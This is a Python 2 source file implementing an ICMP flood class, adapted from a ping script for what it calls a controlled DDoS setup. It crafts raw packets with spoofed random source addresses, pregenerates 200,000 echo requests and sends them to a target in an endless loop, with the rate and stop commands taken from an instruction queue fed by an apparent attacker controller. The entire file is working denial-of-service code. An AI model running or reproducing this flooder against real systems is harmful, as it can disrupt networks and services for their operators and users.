import socket, sys, random, time, Queue, os
from struct import *

"""
    Original version: https://raw.githubusercontent.com/gnotaras/python-ping/master/ping.py
    Script extended and modified to work in the controlled ddos python implementation.


"""

class ICMP_FLOOD():
    def __init__(self, Q, TARGET_IP, TARGET_PORT, RATE, SIZE):
        #threading.Thread.__init__(self) # Required for thread class
        self.target = TARGET_IP
        self.port = TARGET_PORT
        self.rate = RATE
        self.pktsize = SIZE
        self.instruction_q = Q
        self.allpackets = []

        # Create a raw socket
        self.ICMPprot = socket.getprotobyname("icmp")
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, self.ICMPprot)
        except socket.error, msg:
            print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            #sys.exit()
        # tell kernel not to put in headers, since we are providing it
        self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def checksum(self, source_string):
        """
        I'm not too confident that this is right but testing seems
        to suggest that it gives the same answers as in_cksum in ping.c
        """
        sum = 0
        countTo = (len(source_string)/2)*2
        count = 0
        while count<countTo:
            thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
            sum = sum + thisVal
            sum = sum & 0xffffffff # Necessary?
            count = count + 2

        if countTo<len(source_string):
            sum = sum + ord(source_string[len(source_string) - 1])
            sum = sum & 0xffffffff # Necessary?

        sum = (sum >> 16)  +  (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff

        # Swap bytes. Bugger me if I know why.
        answer = answer >> 8 | (answer << 8 & 0xff00)

        return answer

    def pkt(self, id):
        # Original: https://raw.githubusercontent.com/gnotaras/python-ping/master/ping.py

        source_ip = "%i.%i.%i.%i" % (10, random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))

        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = random.randint(1,50000)   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = self.ICMPprot
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( source_ip )
        ip_daddr = socket.inet_aton ( self.target )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        """
        Send one ping to the given >dest_addr<.
        Original: https://raw.githubusercontent.com/gnotaras/python-ping/master/ping.py
        """
        # Header is type (8), code (8), checksum (16), id (16), sequence (16)
        checksum = 0
        header = pack("bbHHh", 8, 0, checksum, id, 1)
        bytesInDouble = calcsize("d")
        data = (self.pktsize - bytesInDouble) * "Z"
        data = pack("d", time.time()) + data
        checksum = self.checksum(header + data)
        header = pack("bbHHh", 8, 0, socket.htons(checksum), id, 1)
        packet = ip_header + header + data
        self.allpackets.append(packet)

    def  main(self):
        time1 = time.time()
        for i in range(200000):
            self.pkt(0xFFFF % random.randint(1,15000))
        time2 = time.time()
        print("Time it took to generate packets: ", str(time2 - time1))
        print "rate: ", str(self.rate)
        self.delay = 0.00001

        while 1:
            i = 0 # Counter
            j = 0

            for P in self.allpackets:
                time1 = time.time()
                i += 1
                j += 1
                if i == 100: # Every 100 packets -> Queue.get for possible instructions
                    i = 0
                    try:
                        data = self.instruction_q.get(False)
                        data_id = data['id']
                        if data[data_id]['status'] == "STOP":
                            break # Return to 'Listening' state / Xattacker.run()
                        else:
                            self.rate = data[data_id]['rate'] # Adjust rate
                            self.delay = float(1) / float(self.rate)
                            print "New rate = ", str(self.rate), " Delay: ", self.delay
                    except Queue.Empty:
                        pass

                self.s.sendto(P, (self.target, 1 ))    # put this in a loop if you want to flood the target
                ##time.sleep(float(1) / self.rate) # Not sub MS capable, needed for packet by packet sending
                while (time.time() - time1) < self.delay: # Sub ms capable sleep loop. Expensive.
                    pass 

